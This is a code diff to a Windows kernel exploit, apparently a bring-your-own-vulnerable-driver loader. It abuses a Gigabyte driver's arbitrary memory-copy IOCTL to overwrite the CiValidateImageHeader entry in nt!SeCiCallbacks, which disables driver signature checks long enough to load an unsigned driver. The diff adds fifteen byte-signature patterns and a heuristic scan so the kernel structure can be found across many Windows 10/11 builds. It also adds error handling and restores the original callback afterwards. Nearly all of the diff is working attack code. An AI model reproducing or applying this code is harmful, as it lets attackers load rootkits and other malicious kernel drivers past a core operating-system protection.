@@ -109,69 +109,240 @@ ULONG_PTR GetKernelModuleAddress(const char* name) {
 }
 
 
-seCiCallbacks_swap getCiValidateImageHeaderEntry()
+// Masked pattern match: 0xFF in mask = byte must match, 0x00 = wildcard, partial masks (e.g. 0xF8) match masked bits
+struct SigPattern {
+	unsigned char bytes[16];
+	unsigned char mask[16];
+	int length;
+	int leaOffset; // offset within pattern to the 4C 8D 05 (lea r8) instruction
+};
+
+// Patterns for finding "lea r8, [nt!SeCiCallbacks]" across Windows 10/11 builds.
+// The LEA is always 4C 8D 05 [disp32]. The preceding instruction(s) vary by build.
+// Ordered from most specific to broadest to minimize false positives.
+static const SigPattern g_CiPatterns[] = {
+	// --- Exact patterns seen in specific builds ---
+	// 1: FF 48 8B D3 4C 8D 05 - (original) tail of call + mov rdx, rbx; lea r8
+	{ {0xFF, 0x48, 0x8B, 0xD3, 0x4C, 0x8D, 0x05},
+	  {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, 7, 4 },
+	// 2: 48 8B D3 4C 8D 05 - mov rdx, rbx; lea r8
+	{ {0x48, 0x8B, 0xD3, 0x4C, 0x8D, 0x05},
+	  {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, 6, 3 },
+	// 3: 48 8B D6 4C 8D 05 - mov rdx, rsi; lea r8
+	{ {0x48, 0x8B, 0xD6, 0x4C, 0x8D, 0x05},
+	  {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, 6, 3 },
+	// 4: 48 8B D7 4C 8D 05 - mov rdx, rdi; lea r8
+	{ {0x48, 0x8B, 0xD7, 0x4C, 0x8D, 0x05},
+	  {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, 6, 3 },
+	// 5: 8B D3 4C 8D 05 - mov edx, ebx; lea r8
+	{ {0x8B, 0xD3, 0x4C, 0x8D, 0x05},
+	  {0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, 5, 2 },
+	// 6: 8B D6 4C 8D 05 - mov edx, esi; lea r8
+	{ {0x8B, 0xD6, 0x4C, 0x8D, 0x05},
+	  {0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, 5, 2 },
+	// 7: 33 D2 4C 8D 05 - xor edx, edx; lea r8
+	{ {0x33, 0xD2, 0x4C, 0x8D, 0x05},
+	  {0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, 5, 2 },
+
+	// --- Win11 23H2/24H2 patterns ---
+	// 8: 48 8D 15 ?? ?? ?? ?? 4C 8D 05 - lea rdx, [rip+xxx]; lea r8 (seen in 23H2+)
+	{ {0x48, 0x8D, 0x15, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x05},
+	  {0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF}, 10, 7 },
+	// 9: 48 8D 0D ?? ?? ?? ?? 4C 8D 05 - lea rcx, [rip+xxx]; lea r8
+	{ {0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x05},
+	  {0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF}, 10, 7 },
+	// 10: 45 33 C9 4C 8D 05 - xor r9d, r9d; lea r8 (4th param zeroed)
+	{ {0x45, 0x33, 0xC9, 0x4C, 0x8D, 0x05},
+	  {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, 6, 3 },
+	// 11: 44 89 ?? 4C 8D 05 - mov [rsp+?], r?d; lea r8 (register spill before call)
+	{ {0x44, 0x89, 0x00, 0x4C, 0x8D, 0x05},
+	  {0xFF, 0xFF, 0x00, 0xFF, 0xFF, 0xFF}, 6, 3 },
+
+	// --- Broad wildcard patterns ---
+	// 12: E8 ?? ?? ?? ?? 4C 8D 05 - call rel32; lea r8
+	{ {0xE8, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x05},
+	  {0xFF, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF}, 8, 5 },
+	// 13: FF 15 ?? ?? ?? ?? 4C 8D 05 - call [rip+disp32]; lea r8
+	{ {0xFF, 0x15, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x05},
+	  {0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF}, 9, 6 },
+	// 14: 48 8B D? 4C 8D 05 - mov rdx, <any 64-bit gpr>; lea r8 (mask 0xF8)
+	{ {0x48, 0x8B, 0xD0, 0x4C, 0x8D, 0x05},
+	  {0xFF, 0xFF, 0xF8, 0xFF, 0xFF, 0xFF}, 6, 3 },
+	// 15: 8B D? 4C 8D 05 - mov edx, <any 32-bit gpr>; lea r8 (mask 0xF8)
+	{ {0x8B, 0xD0, 0x4C, 0x8D, 0x05},
+	  {0xFF, 0xF8, 0xFF, 0xFF, 0xFF}, 5, 2 },
+};
+
+static DWORD64 maskedPatternScan(DWORD64 base, DWORD imageSize, const SigPattern* sig)
 {
-	Printf(L"[!] Searching pattern...\n");
-	// Get ntoskrnl base in kernel
-
-	ULONG_PTR kModuleBase = GetKernelModuleAddress("ntoskrnl.exe");
-	// Load ntoskrnl.exe into usermode and resolve its base 
-	HMODULE uNt = LoadLibraryEx(L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
-	DWORD64 uNtAddr = (DWORD64)uNt;
-	void* ntoskrnl_ptr = (void*)uNt;
-
-	//Calculating the size of the loaded module
-	MODULEINFO modinfo;
-	GetModuleInformation(GetCurrentProcess(), uNt, &modinfo, sizeof(modinfo));
-
-	// pattern sigscan for lea r8, [nt!SeCiCallbacks]
-	unsigned char pattern[] = { 0xff, 0x48, 0x8b, 0xd3, 0x4c, 0x8d, 0x05 };
-
-	// pattern scanning 
-	DWORD64 seCiCallbacksInstr = 0x0;
-	for (unsigned int i = 0; i < modinfo.SizeOfImage; i++)
+	for (unsigned int i = 0; i + sig->length <= imageSize; i++)
 	{
-
-		for (int j = 0; j < sizeof(pattern); j++)
+		bool match = true;
+		for (int j = 0; j < sig->length; j++)
 		{
-			unsigned char chr = *(char*)(uNtAddr + i + j);
-			if (pattern[j] != chr)
+			unsigned char chr = *(unsigned char*)(base + i + j);
+			if ((chr & sig->mask[j]) != (sig->bytes[j] & sig->mask[j]))
 			{
-
+				match = false;
 				break;
 			}
-			if (j + 1 == sizeof(pattern))
-			{
-				seCiCallbacksInstr = uNtAddr + i + 4; // one occurence only 
-			}
+		}
+		if (match)
+			return base + i + sig->leaOffset;
+	}
+	return 0;
+}
+
+// Resolve a RIP-relative LEA target using 32-bit math to prevent carry
+static DWORD64 resolveLeaTarget(DWORD64 leaAddr)
+{
+	DWORD32 disp = *(DWORD32*)(leaAddr + 3);
+	DWORD32 instrLow = (DWORD32)leaAddr;
+	DWORD32 targetLow = instrLow + 7 + disp;
+	return (leaAddr & 0xFFFFFFFF00000000) + targetLow;
+}
+
+// Fallback: scan executable sections for LEA R8 (4C 8D 05) targeting the .data section
+static DWORD64 heuristicLeaScan(DWORD64 base, DWORD imageSize)
+{
+	IMAGE_DOS_HEADER* dosHdr = (IMAGE_DOS_HEADER*)base;
+	IMAGE_NT_HEADERS64* ntHdr = (IMAGE_NT_HEADERS64*)(base + dosHdr->e_lfanew);
+	IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*)((char*)ntHdr + sizeof(IMAGE_NT_HEADERS64));
+
+	// Locate the .data section (where SeCiCallbacks lives)
+	DWORD64 dataStart = 0, dataSize = 0;
+	for (int s = 0; s < ntHdr->FileHeader.NumberOfSections; s++)
+	{
+		if (memcmp(sections[s].Name, ".data", 5) == 0)
+		{
+			dataStart = base + sections[s].VirtualAddress;
+			dataSize = sections[s].Misc.VirtualSize;
+			break;
 		}
 	}
-	if (seCiCallbacksInstr == 0x0)
+	if (dataStart == 0)
+		return 0;
+
+	// Search only executable sections (PAGE, .text, INIT) to reduce false positives
+	for (int s = 0; s < ntHdr->FileHeader.NumberOfSections; s++)
 	{
-		Printf(L"[!] Couldnt find lea r8, [nt!SeCiCallbacks]");
+		if (!(sections[s].Characteristics & IMAGE_SCN_MEM_EXECUTE))
+			continue;
+
+		DWORD64 secBase = base + sections[s].VirtualAddress;
+		DWORD secSize = sections[s].Misc.VirtualSize;
+
+		for (unsigned int i = 0; i + 7 <= secSize; i++)
+		{
+			// Look for 4C 8D 05 (lea r8, [rip+disp32])
+			if (*(unsigned char*)(secBase + i) != 0x4C ||
+				*(unsigned char*)(secBase + i + 1) != 0x8D ||
+				*(unsigned char*)(secBase + i + 2) != 0x05)
+				continue;
+
+			DWORD64 leaAddr = secBase + i;
+			DWORD64 target = resolveLeaTarget(leaAddr);
+
+			// Target must be in .data with room for the struct (0x28 bytes for CiValidateImageHeader at +0x20)
+			if (target < dataStart || target + 0x28 > dataStart + dataSize)
+				continue;
+
+			// Heuristic: next instruction should be call (E8/FF) or mov/lea (48/4C/41/44/45/89/8B/33)
+			// typical of the SepInitializeCodeIntegrity -> CiInitialize call sequence
+			unsigned char nextByte = *(unsigned char*)(leaAddr + 7);
+			if (nextByte == 0xE8 || nextByte == 0xFF || nextByte == 0x48 ||
+				nextByte == 0x4C || nextByte == 0x41 || nextByte == 0x44 ||
+				nextByte == 0x45 || nextByte == 0x89 || nextByte == 0x8B ||
+				nextByte == 0x33)
+				return leaAddr;
+		}
 	}
-	else
+	return 0;
+}
+
+seCiCallbacks_swap getCiValidateImageHeaderEntry()
+{
+	Printf(L"[*] Windows NT %lu.%lu (Build %lu)\n",
+		RtlNtMajorVersion(), RtlNtMinorVersion(),
+		*reinterpret_cast<PULONG>(0x7FFE0000 + 0x0260)); // NtBuildNumber from SharedUserData
+
+	Printf(L"[!] Searching pattern...\n");
+
+	// Get ntoskrnl base in kernel
+	ULONG_PTR kModuleBase = GetKernelModuleAddress("ntoskrnl.exe");
+	if (kModuleBase == 0)
 	{
-		Printf(L"[*] Instr : %p\n", seCiCallbacksInstr);
+		Printf(L"[!] Failed to find ntoskrnl.exe kernel base address\n");
+		return seCiCallbacks_swap{ 0, 0 };
 	}
-	DWORD32 seCiCallbacksLeaOffset = *(DWORD32*)(seCiCallbacksInstr + 3);
-	//Printf(L"[!] seCiCallbacksLeaOffset : %p\n", seCiCallbacksLeaOffset);
-	// The LEA instruction searched for does 32bit math, hence overflow into the more significant 32 bits must be prevented.
-	DWORD32 seCiCallbacksInstrLow = (DWORD32)seCiCallbacksInstr;
-	DWORD32 seCiCallbacksAddrLow = seCiCallbacksInstrLow + 3 + 4 + seCiCallbacksLeaOffset;
-	// calc struct's address in usermode
-	DWORD64 seCiCallbacksAddr = (seCiCallbacksInstr & 0xFFFFFFFF00000000) + seCiCallbacksAddrLow;
-	Printf(L"[*] usermode CiCallbacks : %p\n", seCiCallbacksAddr);
-	// calc offset form base 
+	Printf(L"[*] Kernel ntoskrnl base : %p\n", kModuleBase);
+
+	// Load ntoskrnl.exe into usermode and resolve its base
+	HMODULE uNt = LoadLibraryEx(L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
+	if (uNt == NULL)
+	{
+		Printf(L"[!] Failed to load ntoskrnl.exe into usermode\n");
+		return seCiCallbacks_swap{ 0, 0 };
+	}
+	DWORD64 uNtAddr = (DWORD64)uNt;
+
+	// Get the actual mapped size of the module
+	MODULEINFO modinfo;
+	if (!GetModuleInformation(GetCurrentProcess(), uNt, &modinfo, sizeof(modinfo)))
+	{
+		Printf(L"[!] GetModuleInformation failed\n");
+		FreeLibrary(uNt);
+		return seCiCallbacks_swap{ 0, 0 };
+	}
+	Printf(L"[*] Usermode ntoskrnl    : %p (size 0x%X)\n", uNtAddr, modinfo.SizeOfImage);
+
+	// Try each known pattern for lea r8, [nt!SeCiCallbacks]
+	DWORD64 seCiCallbacksInstr = 0;
+	int numPatterns = sizeof(g_CiPatterns) / sizeof(g_CiPatterns[0]);
+	for (int p = 0; p < numPatterns && seCiCallbacksInstr == 0; p++)
+	{
+		seCiCallbacksInstr = maskedPatternScan(uNtAddr, modinfo.SizeOfImage, &g_CiPatterns[p]);
+		if (seCiCallbacksInstr != 0)
+			Printf(L"[*] Matched pattern %d/%d\n", p + 1, numPatterns);
+	}
+
+	// Fallback: heuristic scan for any LEA R8 in code sections pointing into .data
+	if (seCiCallbacksInstr == 0)
+	{
+		Printf(L"[*] Known patterns failed, trying heuristic scan...\n");
+		seCiCallbacksInstr = heuristicLeaScan(uNtAddr, modinfo.SizeOfImage);
+		if (seCiCallbacksInstr != 0)
+			Printf(L"[*] Heuristic scan found candidate\n");
+	}
+
+	if (seCiCallbacksInstr == 0)
+	{
+		Printf(L"[!] Could not find lea r8, [nt!SeCiCallbacks]\n");
+		Printf(L"[!] Tried %d patterns + heuristic. Your Windows build may not be supported.\n", numPatterns);
+		Printf(L"[!] Please report your build number so support can be added.\n");
+		FreeLibrary(uNt);
+		return seCiCallbacks_swap{ 0, 0 };
+	}
+
+	Printf(L"[*] LEA instr at         : %p\n", seCiCallbacksInstr);
+
+	// Resolve RIP-relative LEA target using 32-bit math to prevent carry
+	DWORD64 seCiCallbacksAddr = resolveLeaTarget(seCiCallbacksInstr);
+	Printf(L"[*] Usermode SeCiCallbacks: %p\n", seCiCallbacksAddr);
+
+	// Calc offset from base and apply to kernel base
 	DWORD64 KernelOffset = seCiCallbacksAddr - uNtAddr;
-	Printf(L"[*] Offset  : %p\n", KernelOffset);
-	// Calc struct address in kernel based on offset 
+	Printf(L"[*] Offset from base     : %p\n", KernelOffset);
 	DWORD64 kernelAddress = kModuleBase + KernelOffset;
-	// Resolving the kernel nt!zwFlushInstructionCache address
+	Printf(L"[*] Kernel SeCiCallbacks : %p\n", kernelAddress);
+
+	// Resolve kernel ZwFlushInstructionCache address (harmless stub used as replacement)
 	DWORD64 zwFlushInstructionCache = (DWORD64)GetProcAddress(uNt, "ZwFlushInstructionCache") - uNtAddr + (DWORD64)kModuleBase;
-	// add hardcoded offset to the SeCiCallbacks struct to get to CiValidateImageHeader's entry 
+
+	// CiValidateImageHeader entry is at offset 0x20 in the SeCiCallbacks struct
 	DWORD64 ciValidateImageHeaderEntry = kernelAddress + 0x20;
 
+	FreeLibrary(uNt);
 	return seCiCallbacks_swap{
 		ciValidateImageHeaderEntry,
 		zwFlushInstructionCache
@@ -375,107 +546,102 @@ TriggerExploit(
 			return Status;
 	}
 
-	// Find where to write 
+	// Find where to write
 	seCiCallbacks_swap w = getCiValidateImageHeaderEntry();
+	if (w.ciValidateImageHeaderEntry == 0 || w.zwFlushInstructionCache == 0)
+	{
+		Printf(L"[!] Failed to resolve SeCiCallbacks addresses. Aborting.\n");
+		NtClose(DeviceHandle);
+		return STATUS_NOT_FOUND;
+	}
 	Printf(L"[!] Where: %p\n", w.ciValidateImageHeaderEntry);
 	Printf(L"[!] What : %p\n", w.zwFlushInstructionCache);
 	
-	// Set up read operation to read original callback 
-	GIOMemcpyInput MemcpyInputR;
-	IO_STATUS_BLOCK IoStatusBlockR;
-	DWORD64 dataR = NULL;
-	ULONG64 targetR = w.ciValidateImageHeaderEntry;
-	MemcpyInputR.Src = targetR;
-	MemcpyInputR.Dst = (ULONG64)&dataR;
-	MemcpyInputR.Size = 8;
-	// Exploit Read primitive 
-
-	RtlZeroMemory(&IoStatusBlockR, sizeof(IoStatusBlockR));
-	Status = NtDeviceIoControlFile(DeviceHandle,
-		nullptr,
-		nullptr,
-		nullptr,
-		&IoStatusBlockR,
-		IOCTL_GIO_MEMCPY,
-		&MemcpyInputR,
-		sizeof(MemcpyInputR),
-		nullptr,
-		0);
-	if (!NT_SUCCESS(Status))
-		Printf(L"NtDeviceIoControlFile(IOCTL_GIO_MEMCPY) *WRITE* failed: error %08X\n", Status);
-
-	Printf(L"[*] Original Callback : %p\n", dataR);
-	
-	// Set up buffer for write operation 
-
-	
+	// Read the original CiValidateImageHeader callback pointer so we can restore it later
 	GIOMemcpyInput MemcpyInput;
 	IO_STATUS_BLOCK IoStatusBlock;
-	DWORD64 data = w.zwFlushInstructionCache;
-	ULONG64 target = w.ciValidateImageHeaderEntry;
-	MemcpyInput.Src  = (ULONG64)&data;
-	MemcpyInput.Dst  = target;
+	DWORD64 originalCallback = 0;
+	MemcpyInput.Src = w.ciValidateImageHeaderEntry;
+	MemcpyInput.Dst = (ULONG64)&originalCallback;
 	MemcpyInput.Size = 8;
-	// Exploit write primitive 
-	
+
 	RtlZeroMemory(&IoStatusBlock, sizeof(IoStatusBlock));
 	Status = NtDeviceIoControlFile(DeviceHandle,
-		nullptr,
-		nullptr,
-		nullptr,
+		nullptr, nullptr, nullptr,
 		&IoStatusBlock,
 		IOCTL_GIO_MEMCPY,
-		&MemcpyInput,
-		sizeof(MemcpyInput),
-		nullptr,
-		0);
-	if (!NT_SUCCESS(Status))
-		Printf(L"NtDeviceIoControlFile(IOCTL_GIO_MEMCPY) *WRITE* failed: error %08X\n", Status);
-	// Load Driver 
-		// Load the Gigabyte loader driver
-	Status = LoadDriver(DriverServiceName);
+		&MemcpyInput, sizeof(MemcpyInput),
+		nullptr, 0);
 	if (!NT_SUCCESS(Status))
 	{
-		Printf(L"Failed to load driver service %ls. NtLoadDriver: %08X.\n", DriverServiceName, Status);
-		return Status;
+		Printf(L"[!] Read primitive failed: %08X\n", Status);
+		goto Cleanup;
 	}
 
-	// The device should exist now. If we still can't open it, bail
-	Status = OpenDeviceHandle(&DeviceHandle, TRUE);
-	if (!NT_SUCCESS(Status))
-		return Status;
-	Printf(L"[*] Successfully Loaded unsigned driver!\n");
-		 
+	Printf(L"[*] Original Callback : %p\n", originalCallback);
 
-	// Restore callback 
-	// Set up buffer for write operation 
+	// Sanity check: the original pointer should be a valid kernel-mode address
+	if (originalCallback == 0 || (originalCallback >> 48) == 0)
+	{
+		Printf(L"[!] Original callback looks invalid (not a kernel pointer). Aborting.\n");
+		Status = STATUS_UNSUCCESSFUL;
+		goto Cleanup;
+	}
 
+	// Overwrite CiValidateImageHeader with ZwFlushInstructionCache (harmless stub)
+	{
+		DWORD64 replacement = w.zwFlushInstructionCache;
+		MemcpyInput.Src = (ULONG64)&replacement;
+		MemcpyInput.Dst = w.ciValidateImageHeaderEntry;
+		MemcpyInput.Size = 8;
 
+		RtlZeroMemory(&IoStatusBlock, sizeof(IoStatusBlock));
+		Status = NtDeviceIoControlFile(DeviceHandle,
+			nullptr, nullptr, nullptr,
+			&IoStatusBlock,
+			IOCTL_GIO_MEMCPY,
+			&MemcpyInput, sizeof(MemcpyInput),
+			nullptr, 0);
+		if (!NT_SUCCESS(Status))
+		{
+			Printf(L"[!] Write primitive (patch) failed: %08X\n", Status);
+			goto Cleanup;
+		}
+		Printf(L"[*] Patched CiValidateImageHeader -> ZwFlushInstructionCache\n");
+	}
 
-	target = w.ciValidateImageHeaderEntry;
-	MemcpyInput.Src = (ULONG64)&dataR;
-	MemcpyInput.Dst = target;
-	MemcpyInput.Size = 8;
-	// Exploit write primitive 
+	// Load the unsigned target driver (CI check is now bypassed)
+	{
+		NTSTATUS LoadStatus = LoadDriver(DriverServiceName);
+		if (!NT_SUCCESS(LoadStatus))
+			Printf(L"[!] Failed to load driver %ls: %08X\n", DriverServiceName, LoadStatus);
+		else
+			Printf(L"[*] Successfully loaded unsigned driver!\n");
+		// Always fall through to restore - never leave the kernel patched
+	}
 
-	RtlZeroMemory(&IoStatusBlock, sizeof(IoStatusBlock));
-	Status = NtDeviceIoControlFile(DeviceHandle,
-		nullptr,
-		nullptr,
-		nullptr,
-		&IoStatusBlock,
-		IOCTL_GIO_MEMCPY,
-		&MemcpyInput,
-		sizeof(MemcpyInput),
-		nullptr,
-		0);
-	if (!NT_SUCCESS(Status))
-		Printf(L"NtDeviceIoControlFile(IOCTL_GIO_MEMCPY) *WRITE* failed: error %08X\n", Status);
-	Printf(L"[*] Restored callback \n");
+	// ALWAYS restore the original callback, even if driver load failed
+	{
+		MemcpyInput.Src = (ULONG64)&originalCallback;
+		MemcpyInput.Dst = w.ciValidateImageHeaderEntry;
+		MemcpyInput.Size = 8;
+
+		RtlZeroMemory(&IoStatusBlock, sizeof(IoStatusBlock));
+		Status = NtDeviceIoControlFile(DeviceHandle,
+			nullptr, nullptr, nullptr,
+			&IoStatusBlock,
+			IOCTL_GIO_MEMCPY,
+			&MemcpyInput, sizeof(MemcpyInput),
+			nullptr, 0);
+		if (!NT_SUCCESS(Status))
+			Printf(L"[!] CRITICAL: Failed to restore callback: %08X\n", Status);
+		else
+			Printf(L"[*] Restored original callback\n");
+	}
+
+Cleanup:
 	UnloadDriver(LoaderServiceName);
-Exit:
 	NtClose(DeviceHandle);
-
 	return Status;
 }
 
@@ -519,11 +685,8 @@ WindLoadDriver(
 	Status = CreateDriverService(LoaderServiceName, LoaderPath);
 	if (!NT_SUCCESS(Status))
 		return Status;
-	// ----------------------------------- works until here -----------------------------
-	
-	// Call TriggerExploit we need to find the address we want to overwrite, load the vulnerable driver , make it writeable and write to it.
-	TriggerExploit(LoaderServiceName,DriverServiceName);
-
+	// Patch SeCiCallbacks, load the unsigned driver, and restore
+	Status = TriggerExploit(LoaderServiceName, DriverServiceName);
 	return Status;
 }
 NTSTATUS
